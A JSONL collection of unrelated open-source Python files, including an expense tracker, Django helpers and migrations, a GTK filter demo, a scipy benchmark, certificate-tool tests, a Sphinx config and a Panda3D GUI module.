{"text": "import datetime\nimport os\nimport sys\nfrom constants import CATEGORIES, DIRECT_DEBIT_PAYMENT, ROOT_DIR\n\ndef sum_total_expenses(data_dict):\n    expenses_sum = 0\n    transaction_nb = 0\n    for i in data_dict:\n        if DIRECT_DEBIT_PAYMENT.lower() not in i['description'].lower() and i['amount'] < 0 and not i['amount'] == -720:\n            expenses_sum += i['amount']\n            transaction_nb += 1\n    return {\n        'expenses_sum': expenses_sum,\n        'transaction_nb': transaction_nb\n    }\n\n\ndef display_highest_amounts(expenses):\n    sorted_result = sorted(expenses, key=lambda x: x['amount'], reverse=True)\n    for i in sorted_result:\n        print('{date} {description} {amount}'.format(date=i['date'], description=i['description'], amount=i['amount']))\n\n\ndef display_sorted_categories(expenses):\n    result_to_display = order_by_category(expenses, CATEGORIES)\n    sorted_result = sorted(result_to_display.items(), key=lambda x: x[1], reverse=True)\n\n    for i in sorted_result:\n        category_amount = i[1]['amount']\n        if category_amount != 0:\n            print('{cat}: {amount}'.format(cat=i[0], amount=category_amount))\n    \n    # if result_to_display['unCategorized']['amount'] != 0:\n    #     print('unCategorized:')\n    #     print(result_to_display['unCategorized'])\n    #     for i in result_to_display['unCategorized']['obj']:\n    #         print(i)\n\n\ndef get_all_data_files():\n    walk_dir = ROOT_DIR\n    result = [os.path.join(root, f) for root, subdirs, files in os.walk(walk_dir) for f in files]\n    return result\n\n\ndef sort_expenses_by_month(expenses_list):\n    result = {}\n    for i in expenses_list:\n        expense_month = str(i['date'].month)\n        expense_year = str(i['date'].year)\n        period = expense_year + '-' + expense_month\n        if period not in result:\n            result[period] = []\n        result[period].append(i)\n    return result\n\ndef get_filename():\n    return sys.argv[1:]\n\n\ndef format_amount(amount):\n    print(\"{:10.2f}\".format(amount))\n\n\ndef format_column(text):\n    return \"{:10.2f}\".format(text)\n\n\ndef date_from_string(str_date, pattern):\n    return datetime.datetime.strptime(str_date, pattern).date()\n\n\ndef order_by_category(expenses, categories):\n    result = {}\n    # initiate result\n    for i in categories:\n        result[i] = {\n            'amount': 0,\n            'obj': []\n        }\n\n    for i in expenses:\n        is_categorized = False\n        for j in categories:\n            for k in categories[j]:\n                if k.lower() in i['description'].lower():\n                    result[j]['amount'] += i['amount']\n                    result[j]['obj'].append(i)\n                    is_categorized = True\n        if not is_categorized:\n            result['unCategorized']['amount'] += i['amount']\n            result['unCategorized']['obj'].append(i)\n    return result\n"}
{"text": "from django.conf import settings\nimport math\nfrom django.core.exceptions import PermissionDenied\nfrom django.shortcuts import render, redirect\n\n\nclass Pager:\n\n    def __init__(self, page, count):\n\n        if page is None or int(page) < 1:\n            page = 1\n        else:\n            page= int(page)\n\n        self.currentPage = page\n        self.downLimit = (page - 1) * settings.PAGE_SIZE\n        self.upLimit = page * settings.PAGE_SIZE\n        self.pages = [page-2, page-1, page, page+1, page+2]\n        self.finalPage = int(math.ceil(float(count) / float(settings.PAGE_SIZE)))\n\n\ndef buildPager(page, count):\n\n    return Pager(page, count)\n\n\ndef render_with_user(request, url, template, data, requires_user=True):\n\n    data['currentUrl'] = url\n\n    current_user = request.session['currentUser']\n\n    if current_user is not None:\n\n        data['current_user'] = current_user['name']\n        return render(request, template, data)\n\n    elif requires_user is False:\n\n        data['current_user'] = ''\n        return render(request, template, data)\n\n    else:\n\n        return redirect('/user/login')\n\n\ndef render_with_user_opt(request, url, template, data):\n    return render_with_user(request, url, template, data, False)\n\n\ndef is_user(request):\n\n    return (request.session['currentUser'] is not None)"}
{"text": "# iterative\n# time: over time, bug on helper function. ~ 18mins\n\nclass Solution:\n    \"\"\"\n    @param matrix, a list of lists of integers\n    @param target, an integer\n    @return a boolean, indicate whether matrix contains target\n    \"\"\"\n    def searchMatrix(self, matrix, target):\n        if matrix is None or matrix == []:\n            return False\n            \n        # width: m, height: n\n        n = len(matrix)\n        m = len(matrix[0])\n        start = 0\n        end = m * n - 1\n        mid = (start + end) / 2\n        \n        while start + 1 < end:\n            mid_value = self.get_element(matrix, mid, m)\n            if mid_value == target:\n                return True\n            if mid_value < target:\n                start = mid\n            if mid_value > target:\n                end = mid\n            mid = (start + end) / 2\n        else:\n            if self.get_element(matrix, start, m) == target:\n                return True\n            if self.get_element(matrix, end, m) == target:\n                return True\n            return False\n            \n            \n    \n    def get_element(self, matrix, i, m):\n        index_1 = i / m \n        index_2 = i % m\n        return matrix[index_1][index_2]\n"}
{"text": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\n# Copyright (C) 2018  David Arroyo Men\u00e9ndez\n\n# Author: David Arroyo Men\u00e9ndez <davidam@gnu.org>\n# Maintainer: David Arroyo Men\u00e9ndez <davidam@gnu.org>\n\n# This file is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 3, or (at your option)\n# any later version.\n\n# This file is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with GNU Emacs; see the file COPYING.  If not, write to\n# the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,\n# Boston, MA 02110-1301 USA,\n\n# Se podr\u00eda con este fichero mejorarlo hasta pillar estad\u00edsticas de tiobe con scraping\n\nimport gi\ngi.require_version('Gtk', '3.0')\nfrom gi.repository import Gtk\n\n#list of tuples for each software, containing the software name, initial release, and main programming languages used\nsoftware_list = [(\"Firefox\", 2002,  \"C++\"),\n                 (\"Eclipse\", 2004, \"Java\" ),\n                 (\"Pitivi\", 2004, \"Python\"),\n                 (\"Netbeans\", 1996, \"Java\"),\n                 (\"Chrome\", 2008, \"C++\"),\n                 (\"Filezilla\", 2001, \"C++\"),\n                 (\"Bazaar\", 2005, \"Python\"),\n                 (\"Git\", 2005, \"C\"),\n                 (\"Linux Kernel\", 1991, \"C\"),\n                 (\"GCC\", 1987, \"C\"),\n                 (\"Frostwire\", 2004, \"Java\")]\n\nclass TreeViewFilterWindow(Gtk.Window):\n\n    def __init__(self):\n        Gtk.Window.__init__(self, title=\"Treeview Filter Demo\")\n        self.set_border_width(10)\n\n        #Setting up the self.grid in which the elements are to be positionned\n        self.grid = Gtk.Grid()\n        self.grid.set_column_homogeneous(True)\n        self.grid.set_row_homogeneous(True)\n        self.add(self.grid)\n\n        #Creating the ListStore model\n        self.software_liststore = Gtk.ListStore(str, int, str)\n        for software_ref in software_list:\n            self.software_liststore.append(list(software_ref))\n        self.current_filter_language = None\n\n        #Creating the filter, feeding it with the liststore model\n        self.language_filter = self.software_liststore.filter_new()\n        #setting the filter function, note that we're not using the\n        self.language_filter.set_visible_func(self.language_filter_func)\n\n        #creating the treeview, making it use the filter as a model, and adding the columns\n        self.treeview = Gtk.TreeView.new_with_model(self.language_filter)\n        for i, column_title in enumerate([\"Software\", \"Release Year\", \"Programming Language\"]):\n            renderer = Gtk.CellRendererText()\n            column = Gtk.TreeViewColumn(column_title, renderer, text=i)\n            self.treeview.append_column(column)\n\n        #creating buttons to filter by programming language, and setting up their events\n        self.buttons = list()\n        for prog_language in [\"Java\", \"C\", \"C++\", \"Python\", \"None\"]:\n            button = Gtk.Button(prog_language)\n            self.buttons.append(button)\n            button.connect(\"clicked\", self.on_selection_button_clicked)\n\n        #setting up the layout, putting the treeview in a scrollwindow, and the buttons in a row\n        self.scrollable_treelist = Gtk.ScrolledWindow()\n        self.scrollable_treelist.set_vexpand(True)\n        self.grid.attach(self.scrollable_treelist, 0, 0, 8, 10)\n        self.grid.attach_next_to(self.buttons[0], self.scrollable_treelist, Gtk.PositionType.BOTTOM, 1, 1)\n        for i, button in enumerate(self.buttons[1:]):\n            self.grid.attach_next_to(button, self.buttons[i], Gtk.PositionType.RIGHT, 1, 1)\n        self.scrollable_treelist.add(self.treeview)\n\n        self.show_all()\n\n    def language_filter_func(self, model, iter, data):\n        \"\"\"Tests if the language in the row is the one in the filter\"\"\"\n        if self.current_filter_language is None or self.current_filter_language == \"None\":\n            return True\n        else:\n            return model[iter][2] == self.current_filter_language\n\n    def on_selection_button_clicked(self, widget):\n        \"\"\"Called on any of the button clicks\"\"\"\n        #we set the current language filter to the button's label\n        self.current_filter_language = widget.get_label()\n        print(\"%s language selected!\" % self.current_filter_language)\n        #we update the filter, which updates in turn the view\n        self.language_filter.refilter()\n\n\nwin = TreeViewFilterWindow()\nwin.connect(\"destroy\", Gtk.main_quit)\nwin.show_all()\nGtk.main()\n"}
{"text": "#!/usr/bin/env python\n#\n# @license Apache-2.0\n#\n# Copyright (c) 2018 The Stdlib Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Benchmark scipy.special.eval_hermite.\"\"\"\n\nfrom __future__ import print_function\nimport timeit\n\nNAME = \"hermitepoly\"\nREPEATS = 3\nITERATIONS = 1000000\nCOUNT = [0]  # use a list to allow modification within nested scopes\n\n\ndef print_version():\n    \"\"\"Print the TAP version.\"\"\"\n    print(\"TAP version 13\")\n\n\ndef print_summary(total, passing):\n    \"\"\"Print the benchmark summary.\n\n    # Arguments\n\n    * `total`: total number of tests\n    * `passing`: number of passing tests\n\n    \"\"\"\n    print(\"#\")\n    print(\"1..\" + str(total))  # TAP plan\n    print(\"# total \" + str(total))\n    print(\"# pass  \" + str(passing))\n    print(\"#\")\n    print(\"# ok\")\n\n\ndef print_results(iterations, elapsed):\n    \"\"\"Print benchmark results.\n\n    # Arguments\n\n    * `iterations`: number of iterations\n    * `elapsed`: elapsed time (in seconds)\n\n    # Examples\n\n    ``` python\n    python> print_results(100000, 0.131009101868)\n    ```\n    \"\"\"\n    rate = iterations / elapsed\n\n    print(\"  ---\")\n    print(\"  iterations: \" + str(iterations))\n    print(\"  elapsed: \" + str(elapsed))\n    print(\"  rate: \" + str(rate))\n    print(\"  ...\")\n\n\ndef benchmark(name, setup, stmt, iterations):\n    \"\"\"Run the benchmark and print benchmark results.\n\n    # Arguments\n\n    * `name`: benchmark name (suffix)\n    * `setup`: benchmark setup\n    * `stmt`: statement to benchmark\n    * `iterations`: number of iterations\n\n    # Examples\n\n    ``` python\n    python> benchmark(\"::random\", \"from random import random;\", \"y = random()\", 1000000)\n    ```\n    \"\"\"\n    t = timeit.Timer(stmt, setup=setup)\n\n    i = 0\n    while i < REPEATS:\n        print(\"# python::scipy::\" + NAME + name)\n        COUNT[0] += 1\n        elapsed = t.timeit(number=iterations)\n        print_results(iterations, elapsed)\n        print(\"ok \" + str(COUNT[0]) + \" benchmark finished\")\n        i += 1\n\n\ndef main():\n    \"\"\"Run the benchmarks.\"\"\"\n    print_version()\n\n    name = \"\"\n    setup = \"from scipy.special import eval_hermite; from random import random;\"\n    stmt = \"y = eval_hermite(2, random()*10.0 - 5.0)\"\n    benchmark(name, setup, stmt, ITERATIONS)\n\n    print_summary(COUNT[0], COUNT[0])\n\n\nif __name__ == \"__main__\":\n    main()\n"}
{"text": "# coding=utf8\n# Create your views here.\n\nfrom django.shortcuts import render\nfrom django.http import HttpResponse\n\nfrom ONPEcrawler import ONPEcrawler\nimport Elecciones.models as m\n\ndef index(request):\n    return render(request,'index.html')\n\ndef seed(request):\n    \n    crawler = ONPEcrawler(url = \"http://www.web.onpe.gob.pe/modElecciones/elecciones/elecciones2011/1ravuelta/onpe/congreso/\" )\n    crawler.seed_tree()\n\n    return HttpResponse('Success')\n\ndef crawl(request):\n    \n    crawler = ONPEcrawler(url = \"http://www.web.onpe.gob.pe/modElecciones/elecciones/elecciones2011/1ravuelta/onpe/congreso/\" )\n    crawler.make_tree()\n\n    return HttpResponse('Success')\n\n\ndef test(request):\n    crawler = ONPEcrawler(url = \"http://www.web.onpe.gob.pe/modElecciones/elecciones/elecciones2011/1ravuelta/onpe/congreso/\" )\n    (f, soup) = crawler.test()\n    print soup\n\n    return HttpResponse('Success')\n\ndef visualize_tree(request):\n    return render(request,'visualize_tree.html',{'locales':m.UbiGeo.objects.filter(tipo='local'),\n                                                 'departamentos':m.UbiGeo.objects.filter(tipo='departamento')})\n\ndef clean_db(request):\n\n    for item in m.UbiGeo.objects.all():\n        item.delete()\n\n    return HttpResponse('Success')\n"}
{"text": "\nfrom synapse.tests.common import *\n\nimport synapse.tools.easycert as s_easycert\n\n    #pars.add_argument('--certdir', default='~/.syn/certs', help='Directory for certs/keys')\n    ##pars.add_argument('--signas', help='sign the new cert with the given cert name')\n    #pars.add_argument('--ca', default=False, action='store_true', help='mark the certificate as a CA/CRL signer')\n\nclass TestEasyCert(SynTest):\n\n    def test_easycert_user_sign(self):\n        with self.getTestDir() as path:\n            outp = self.getTestOutp()\n\n            argv = ['--ca','--certdir',path,'testca']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            self.assertTrue( str(outp).find('cert saved') )\n\n            argv = ['--certdir',path,'--signas','testca','user@test.com']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            self.assertTrue( str(outp).find('cert saved') )\n\n    def test_easycert_server_sign(self):\n        with self.getTestDir() as path:\n            outp = self.getTestOutp()\n\n            argv = ['--ca','--certdir',path,'testca']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            self.assertTrue( str(outp).find('cert saved') )\n\n            argv = ['--certdir',path,'--signas','testca','--server','test.vertex.link']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            self.assertTrue( str(outp).find('cert saved') )\n\n    def test_easycert_csr(self):\n        with self.getTestDir() as path:\n\n            outp = self.getTestOutp()\n            argv = ['--csr','--certdir',path,'user@test.com']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            outp.expect('csr saved:')\n\n            outp = self.getTestOutp()\n            argv = ['--ca','--certdir',path,'testca']\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            outp.expect('cert saved:')\n\n            outp = self.getTestOutp()\n            csrpath = os.path.join(path,'users','user@test.com.csr')\n            argv = ['--certdir',path,'--signas','testca','--sign-csr',csrpath ]\n            self.assertEqual( s_easycert.main(argv,outp=outp), 0)\n            outp.expect('cert saved:')\n"}
{"text": "# -*- coding: utf-8 -*-\n\n# This code is part of Qiskit.\n#\n# (C) Copyright IBM 2018.\n#\n# This code is licensed under the Apache License, Version 2.0. You may\n# obtain a copy of this license in the LICENSE.txt file in the root directory\n# of this source tree or at http://www.apache.org/licenses/LICENSE-2.0.\n#\n# Any modifications or derivative works of this code must retain this\n# copyright notice, and modified files need to carry a notice indicating\n# that they have been altered from the originals.\n\n# pylint: disable=invalid-name\n# Configuration file for the Sphinx documentation builder.\n#\n# This file does only contain a selection of the most common options. For a\n# full list see the documentation:\n# http://www.sphinx-doc.org/en/master/config\n\n# -- Path setup --------------------------------------------------------------\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n#\n# import os\n# import sys\n# sys.path.insert(0, os.path.abspath('.'))\n\n\"\"\"\nSphinx documentation builder\n\"\"\"\n\n# -- Project information -----------------------------------------------------\nproject = 'Qiskit'\ncopyright = '2019, Qiskit Development Team'  # pylint: disable=redefined-builtin\nauthor = 'Qiskit Development Team'\n\n# The short X.Y version\nversion = ''\n# The full version, including alpha/beta/rc tags\nrelease = '0.12.0'\n\n# -- General configuration ---------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#\n# needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be\n# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom\n# ones.\nextensions = [\n    'sphinx.ext.autodoc',\n    'sphinx.ext.mathjax',\n    'sphinx.ext.napoleon',\n    'sphinx.ext.viewcode',\n    'sphinx.ext.extlinks',\n    'sphinx_tabs.tabs',\n    'sphinx_automodapi.automodapi',\n    'IPython.sphinxext.ipython_console_highlighting',\n    'IPython.sphinxext.ipython_directive',\n    'reno.sphinxext',\n]\n\n\n# If true, figures, tables and code-blocks are automatically numbered if they\n# have a caption.\nnumfig = True\n\n# A dictionary mapping 'figure', 'table', 'code-block' and 'section' to\n# strings that are used for format of figure numbers. As a special character,\n# %s will be replaced to figure number.\nnumfig_format = {\n    'table': 'Table %s'\n}\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#\n# This is also used if you do content translation via gettext catalogs.\n# Usually you set \"language\" from the command line for these cases.\nlanguage = None\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\n# This pattern also affects html_static_path and html_extra_path.\nexclude_patterns = []\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = None\n\n# A boolean that decides whether module names are prepended to all object names\n# (for object types where a \u201cmodule\u201d of some kind is defined), e.g. for\n# py:function directives.\nadd_module_names = False\n\n# A list of prefixes that are ignored for sorting the Python module index\n# (e.g., if this is set to ['foo.'], then foo.bar is shown under B, not F).\n# This can be handy if you document a project that consists of a single\n# package. Works only for the HTML builder currently.\nmodindex_common_prefix = ['qiskit.']\n\n# -- Configuration for extlinks extension ------------------------------------\n# Refer to https://www.sphinx-doc.org/en/master/usage/extensions/extlinks.html\n\n\n# -- Options for HTML output -------------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#\nhtml_theme = 'sphinx_rtd_theme'  # use the theme in subdir 'theme'\n\nhtml_sidebars = {'**': ['globaltoc.html']}\nhtml_last_updated_fmt = '%Y/%m/%d'\n"}
{"text": "# Copyright 2017 AT&T Intellectual Property.  All other rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nDOCUMENT_SCHEMA_TYPES = (\n    CERTIFICATE_AUTHORITY_SCHEMA,\n    CERTIFICATE_KEY_AUTHORITY_SCHEMA,\n    CERTIFICATE_SCHEMA,\n    CERTIFICATE_KEY_SCHEMA,\n    PRIVATE_KEY_SCHEMA,\n    PUBLIC_KEY_SCHEMA,\n    PASSPHRASE_SCHEMA,\n    DATA_SCHEMA_SCHEMA,\n    LAYERING_POLICY_SCHEMA,\n    PASSPHRASE_SCHEMA,\n    VALIDATION_POLICY_SCHEMA,\n) = (\n    'deckhand/CertificateAuthority',\n    'deckhand/CertificateAuthorityKey',\n    'deckhand/Certificate',\n    'deckhand/CertificateKey',\n    'deckhand/PrivateKey',\n    'deckhand/PublicKey',\n    'deckhand/Passphrase',\n    'deckhand/DataSchema',\n    'deckhand/LayeringPolicy',\n    'deckhand/Passphrase',\n    'deckhand/ValidationPolicy',\n)\n\n\nDOCUMENT_SECRET_TYPES = (\n    CERTIFICATE_AUTHORITY_SCHEMA,\n    CERTIFICATE_KEY_AUTHORITY_SCHEMA,\n    CERTIFICATE_KEY_SCHEMA,\n    CERTIFICATE_SCHEMA,\n    PRIVATE_KEY_SCHEMA,\n    PUBLIC_KEY_SCHEMA,\n    PASSPHRASE_SCHEMA\n) = (\n    'deckhand/CertificateAuthority',\n    'deckhand/CertificateAuthorityKey',\n    'deckhand/Certificate',\n    'deckhand/CertificateKey',\n    'deckhand/PrivateKey',\n    'deckhand/PublicKey',\n    'deckhand/Passphrase'\n)\n\n\nDECKHAND_VALIDATION_TYPES = (\n    DECKHAND_SCHEMA_VALIDATION,\n) = (\n    'deckhand-schema-validation',\n)\n\n\nENCRYPTION_TYPES = (\n    CLEARTEXT,\n    ENCRYPTED\n) = (\n    'cleartext',\n    'encrypted'\n)\n"}
{"text": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n\"\"\"\r\nbudget_term_densities\r\n\r\nCalculates density maps for nutrient budget terms from NEMO-ERSEM output.\r\n\r\nNERC-DEFRA SSB-BlueC projects\r\n\r\nCreated on Tue Jan 24 09:18:52 2017\r\n\r\n@author: TAMS00\r\n\"\"\"\r\n\r\n#import pandas as pd\r\nimport netCDF4\r\nimport xarray as xr\r\nimport numpy as np\r\nimport os\r\nimport matplotlib.pyplot as plt\r\nfrom mpl_toolkits.basemap import Basemap, cm\r\nimport argparse\r\n\r\nif (('Windows' in os.environ['OSTYPE']) and \r\n                 (os.environ['COMPUTERNAME']=='PC4447')):\r\n    base='c:/Users/tams00/Documents/nerc_ssb/c_fluxes/AMM7-HINDCAST-v0-erosion'\r\nelse:\r\n    base='/nerc/n01/n01/momme/AMM7-HINDCAST-v0-erosion'\r\n\r\n\r\nmodelpaths=[os.path.join(base+'/1981/01/','amm7_1d_19810101_19810131_grid_T.nc')]#,\r\n            #os.path.join(base+'/1981/02/','amm7_1d_19810201_19810228_grid_T.nc')]\r\n            #os.path.join(base+'/1981/01/','restart_trc.nc'),\r\n\r\n\r\n#modelvars=[['Y4_fdetrc_result']]\r\n#modelvars=[['net_PelBen_POC_result','G3_c_pb_flux','nav_lon','nav_lat'],\r\n#['fabm_st2DnQ1_c','fabm_st2DnQ6_c','fabm_st2DnQ7_c','fabm_st2DnQ17_c','fabm_st2DnH1_c','fabm_st2DnH2_c','fabm_st2DnY2_c','fabm_st2DnY3_c','fabm_st2DnY4_c','fabm_st2DnG3_c'],\r\n#['fabm_st2DnQ1_c','fabm_st2DnQ6_c','fabm_st2DnQ7_c','fabm_st2DnQ17_c','fabm_st2DnH1_c','fabm_st2DnH2_c','fabm_st2DnY2_c','fabm_st2DnY3_c','fabm_st2DnY4_c','fabm_st2DnG3_c']]\r\n\r\npar_3d=['TRNO3_c','TRNP1_c','TRNP2_c','TRNP3_c','TRNP4_c','TRNB1_c','TRNZ4_c','TRNZ5_c','TRNZ6_c','TRNR4_c','TRNR6_c','TRNR8_c','TRNR1_c','TRNR2_c','TRNR3_c','TRNL2_c']\r\npar_2d=['fabm_st2DnQ1_c','fabm_st2DnQ6_c','fabm_st2DnQ7_c','fabm_st2DnQ17_c','fabm_st2DnH1_c','fabm_st2DnH2_c','fabm_st2DnY2_c','fabm_st2DnY3_c','fabm_st2DnY4_c','fabm_st2DnG3_c']\r\nadv_3d=['XAD_O3_c_e3t']\r\n\r\nmodelvars=adv_3d\r\n\r\n# main() to take an optional 'argv' argument, which allows us to call it from the interactive Python prompt:\r\ndef main(argv=None):\r\n\r\n\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument('--basedir',nargs=1,help='base directory with model files')\r\n    args = parser.parse_args()\r\n\r\n    print(args)\r\n\r\n    try:\r\n        base = args.basedir\r\n    else:\r\n        base = base\r\n\r\n    # Naughty datasets might require decode_cf=False\r\n    # Here it just needed decode_times=False\r\n    print('********************')\r\n    print(modelpaths[0])\r\n    #data = xr.open_dataset(modelpaths[0],decode_times=False)\r\n    modelout = xr.open_mfdataset(modelpaths) #,decode_times=False)\r\n    #print(modelout)\r\n    \r\n    for modelvar in modelvars:\r\n        vardf=modelout[modelvar]\r\n        print(vardf) \r\n        # print attributes\r\n        for at in vardf.attrs:\r\n            print(at+':\\t\\t',end=' ')\r\n            print(vardf.attrs[at])\r\n\r\n        timeavg=vardf.mean('time_counter')\r\n        timeavg.plot()\r\n\r\n            \r\nif __name__ == \"__main__\":\r\n    main()\r\n"}
{"text": "from direct.gui.DirectGui import DirectButton, DirectLabel\nfrom panda3d.core import TextNode, Vec4\n\nPreloaded = {}\n\ndef loadModels():\n    if Preloaded:\n        return\n    gui = loader.loadModel('phase_3.5/models/gui/fishingBook.bam')\n    Preloaded['tab1'] = gui.find('**/tabs/polySurface1')\n    Preloaded['tab2'] = gui.find('**/tabs/polySurface2')\n    gui.removeNode()\n    del gui\n\n    guiButton = loader.loadModel('phase_3/models/gui/quit_button')\n    Preloaded['button1'] = guiButton.find('**/QuitBtn_UP')\n    Preloaded['button2'] = guiButton.find('**/QuitBtn_DN')\n    Preloaded['button3'] = guiButton.find('**/QuitBtn_RLVR')\n    guiButton.removeNode()\n    del guiButton\n\nnormalColor = (1, 1, 1, 1)\nclickColor = (0.8, 0.8, 0, 1)\nrolloverColor = (0.15, 0.82, 1.0, 1)\ndiabledColor = (1.0, 0.98, 0.15, 1)\n\n\nclass OptionTab(DirectButton):\n    def __init__(self, tabType=2, parent=None, **kw):\n        loadModels()\n\n        if parent is None:\n            parent = aspect2d\n\n        if tabType == 1:\n            image = Preloaded['tab1']\n        elif tabType == 2:\n            image = Preloaded['tab2']\n        else:\n            image = None\n\n        optiondefs = (\n            ('relief', None, None),\n            ('text_align', TextNode.ALeft, None),\n            ('text_fg', Vec4(0.2, 0.1, 0, 1), None),\n            ('image', image, None),\n            ('image_color', normalColor, None),\n            ('image1_color', clickColor, None),\n            ('image2_color', rolloverColor, None),\n            ('image3_color', diabledColor, None),\n            ('image_scale', (0.033, 0.033, 0.035), None),\n            ('image_hpr', (0, 0, -90), None)\n        )\n\n        self.defineoptions(kw, optiondefs)\n        DirectButton.__init__(self, parent)\n        self.initialiseoptions(OptionTab)\n\nbuttonbase_xcoord = 0.35\nbuttonbase_ycoord = 0.45\n\nclass OptionButton(DirectButton):\n    def __init__(self, parent=None, wantLabel=False, z=buttonbase_ycoord, labelZ=None,\n                 labelOrientation='left', labelPos=None, labelText='', image_scale=(0.7, 1, 1), text='', **kw):\n        loadModels()\n\n        if parent is None:\n            parent = aspect2d\n\n        pos = (buttonbase_xcoord, 0, z) if not kw.get('pos') else kw['pos']\n        optiondefs = (\n            ('relief', None, None),\n            ('image', (Preloaded['button1'], Preloaded['button2'], Preloaded['button3']), None),\n            ('image_scale', image_scale, None),\n            ('text', text, None),\n            ('text_scale', 0.052, None),\n            ('text_pos', (0, -0.02), None),\n            ('pos', pos, None),\n        )\n\n        self.defineoptions(kw, optiondefs)\n        DirectButton.__init__(self, parent)\n        self.initialiseoptions(OptionButton)\n        if wantLabel:\n            self.label=OptionLabel(parent=self, z=labelZ, pos=labelPos, orientation=labelOrientation,\n                                   text=labelText)\n\ntitleHeight = 0.61\ntextStartHeight = 0.45\nleftMargin = -0.72\n\nclass OptionLabel(DirectLabel):\n    def __init__(self,  parent=None, z=textStartHeight, text_wordwrap=16, text='',\n                 orientation='left', **kw):\n        loadModels()\n\n        if parent is None:\n            parent = aspect2d\n\n        if orientation == 'left':\n            pos = (leftMargin, 0, z)\n            text_align = TextNode.ALeft\n        else:\n            pos = kw['pos']\n            text_align = TextNode.ACenter\n\n        optiondefs = (\n            ('relief', None, None),\n            ('pos', pos, None),\n            ('text_align', text_align, None),\n            ('text_scale', 0.052, None),\n            ('text_wordwrap', text_wordwrap, None),\n            ('text', text, None)\n        )\n\n        self.defineoptions(kw, optiondefs)\n        DirectLabel.__init__(self, parent)\n        self.initialiseoptions(OptionLabel)"}
{"text": "#!/usr/bin/python\n#\n# Copyright 2018-2021 Polyaxon, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom marshmallow import fields\n\nfrom polyaxon.schemas.base import BaseCamelSchema, BaseConfig\n\n\nclass AuthSchema(BaseCamelSchema):\n    enabled = fields.Bool(allow_none=True)\n    external = fields.Str(allow_none=True)\n    use_resolver = fields.Bool(allow_none=True)\n\n    @staticmethod\n    def schema_config():\n        return AuthConfig\n\n\nclass AuthConfig(BaseConfig):\n    SCHEMA = AuthSchema\n    REDUCED_ATTRIBUTES = [\"enabled\", \"external\", \"useResolver\"]\n\n    def __init__(self, enabled=None, external=None, use_resolver=None):\n        self.enabled = enabled\n        self.external = external\n        self.use_resolver = use_resolver\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport autoslug.fields\nfrom django.conf import settings\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Category',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, verbose_name='ID', primary_key=True)),\n                ('name', models.CharField(max_length=50)),\n                ('created_at', models.DateTimeField(auto_now_add=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='Post',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, verbose_name='ID', primary_key=True)),\n                ('title', models.CharField(max_length=300)),\n                ('content', models.TextField()),\n                ('slug', autoslug.fields.AutoSlugField(editable=False, unique=True)),\n                ('created_at', models.DateTimeField(auto_now_add=True)),\n                ('updated_at', models.DateTimeField(auto_now=True)),\n                ('author', models.ForeignKey(related_name='posts', to=settings.AUTH_USER_MODEL)),\n                ('categories', models.ManyToManyField(to='blog.Category', related_name='posts')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n    ]\n"}
